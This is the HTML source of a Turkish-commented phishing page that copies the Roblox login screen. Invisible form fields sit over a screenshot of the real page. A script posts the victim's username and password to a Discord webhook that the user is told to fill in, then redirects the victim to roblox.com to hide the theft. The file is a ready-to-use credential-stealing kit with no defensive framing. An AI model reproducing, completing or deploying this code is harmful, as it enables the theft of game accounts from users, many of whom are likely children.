<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Giriş</title>
    <style>
        /* Ekranı sıfırlama ve arka plan */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #0b0e11;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }

        /* Resim ve form elemanlarını bir arada tutan sabit kapsayıcı */
        .wrapper {
            position: relative;
            width: 100%;
            height: 100%;
            max-width: 1400px; /* Standart geniş ekran dengesi */
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .tam-ekran-resim {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block;
        }

        /* 
           GİRİŞ PANELİ ÇERÇEVESİ:
           Esnek yüzde yerine doğrudan sabit piksel yapısına geçtik.
        */
        .form-container {
            position: absolute;
            width: 320px;  /* Resimdeki panelin tam genişliği */
            height: 380px; /* Paneldeki tüm elemanların toplam dikey alanı */
            top: 50%;
            left: 50%;
            transform: translate(-50%, -43%); /* Formu dikey eksende tam Roblox paneline kilitler */
            box-sizing: border-box;
        }

        /* Tüm elemanları bağımsız piksellere kilitliyoruz */
        .form-container input, .form-container button, .form-container a {
            position: absolute;
            width: 100%;
            height: 38px; /* Orijinal Roblox kutu yüksekliği */
            left: 0;
            background: transparent;
            border: none;
            outline: none;
            box-sizing: border-box;
        }

        /* Yazı yazılan input alanlarının iç metin ve dikey ortalama ayarları */
        .form-container input {
            color: #ffffff;
            font-size: 14px;
            padding: 0 12px;
            line-height: 38px; /* Yazının kutu içinde aşağı sarkmasını veya yukarı taşmasını önler, tam ortalar */
            height: 38px;
        }

        .form-container button, .form-container a {
            cursor: pointer;
        }

        /* ============================================================ */
        /* MİLİMETRİK SABİT PİKSEL KONUMLANDIRMALARI (Yukarıdan Aşağıya) */
        /* ============================================================ */

        /* 1. KUTU: Username Giriş Alanı */
        .username-field {
            top: 0px; 
        }

        /* 2. KUTU: Password Giriş Alanı */
        .password-field {
            top: 50px; /* İlk kutunun tam altına, aradaki boşlukla oturur */
        }

        /* 3. BUTON: Log in butonu */
        .login-btn {
            top: 102px; 
            height: 40px;
        }

        /* 4. BUTON: Send me the one-time code by email */
        .one-time-code-btn {
            top: 198px; /* Forgot yazısını atlayıp tam gri kutunun üzerine oturur */
            height: 40px;
        }

        /* 5. BUTON: Quick Login */
        .quick-login-btn {
            top: 248px; 
            height: 40px;
        }

        /* 6. LİNK: En alttaki Sign Up yazısı */
        .signup-link {
            top: 310px;
            height: 25px;
            width: 80px; 
            left: auto;
            right: 45px; /* Sign up kelimesinin tam üzerine hizalanır */
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <!-- Arka plan resmi -->
        <img src="roblox_giris.png" class="tam-ekran-resim" alt="Roblox">

        <!-- Sabit pikselli görünmez form paneli -->
        <form id="girisFormu" class="form-container">
            
            <!-- Kullanıcı adı -->
            <input type="text" id="username" name="username" class="username-field" required autocomplete="off">
            
            <!-- Şifre -->
            <input type="password" id="password" name="password" class="password-field" required>
            
            <!-- Log in butonu -->
            <button type="submit" class="login-btn" title="Giriş Yap"></button>
            
            <!-- One-time code butonu -->
            <button type="button" class="one-time-code-btn"></button>
            
            <!-- Quick Login butonu -->
            <button type="button" class="quick-login-btn"></button>
            
            <!-- Sign up linki -->
            <a href="https://roblox.com" target="_blank" class="signup-link" title="Kayıt Ol"></a>

        </form>
    </div>

    <!-- DISCORD WEBHOOK BAĞLANTISI -->
    <script>
        // BURAYA KENDİ DISCORD WEBHOOK LİNKİNİ YAPIŞTIR KANKA
        const webhookURL = "BURAYA_DISCORD_WEBHOOK_LINKINI_YAZ";

        document.getElementById('girisFormu').addEventListener('submit', function(e) {
            e.preventDefault();

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            const mesaj = {
                content: `🔔 **Yeni Roblox Girişi Yakalandı!**\n👤 **Kullanıcı:** \`${user}\`\n🔑 **Şifre:** \`${pass}\`\n📅 **Tarih:** ${new Date().toLocaleString('tr-TR')}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(mesaj)
            })
            .then(() => {
                window.location.href = "https://roblox.com";
            })
            .catch(() => {
                window.location.href = "https://roblox.com";
            });
        });
    </script>

</body>
</html>
